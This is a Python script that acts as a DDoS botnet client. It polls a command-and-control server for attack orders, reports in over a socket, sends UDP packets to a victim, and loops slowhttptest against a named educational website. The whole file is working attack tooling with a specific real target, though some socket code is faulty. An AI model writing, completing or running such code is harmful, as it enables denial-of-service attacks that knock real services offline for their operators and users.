import socket
import time
import os
import atexit
import urllib2 as url 


host = "http://ddosyourlife.ddns.net"
port = 12345


def goodbye():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(b'bye')
        s.close()
    except:
        pass



def attack():
    atexit.register(goodbye)
    attacking = False
    while attacking == False:
        #try:
        content = url.urlopen("http://ddosyourlife.ddns.net/ddos/attack.txt")
        data  = content.read()
        tmp = data.split(";")
        if tmp[0] == "run":    
            
            order = tmp[0]
            victim = tmp[1]
            if order == 'run':
                print("Started coordinated attack to " + victim)
                

                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.sendall(b'hello')
                s.close()
                
                attacking = True
                ddos(victim)
        

        #except socket.error:
        #    print("Error Occured.")

        time.sleep(.5)


def ddos(objective):
    print(objective)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = bytes(5234)
    ip = objective
    port = 80
    sent = 0
    try:
        sock.sendto(byte, (ip,port))
        sent = sent + 1
        print( "Sent % s packet to % s throught port:% s" %(sent,ip,port))
    except Exception:
        print("Error parsing ip")
        time.sleep(10)
        exit()
    while True:
        os.system("slowhttptest -c 50000 -H -g -o slowhttp -i 5 -r 1000 -t GET -u https://aulavirtual.caib.es/c07001551 -p 5 -l 20")



os.system("clear")
victim = ""
attacking = None
attack()




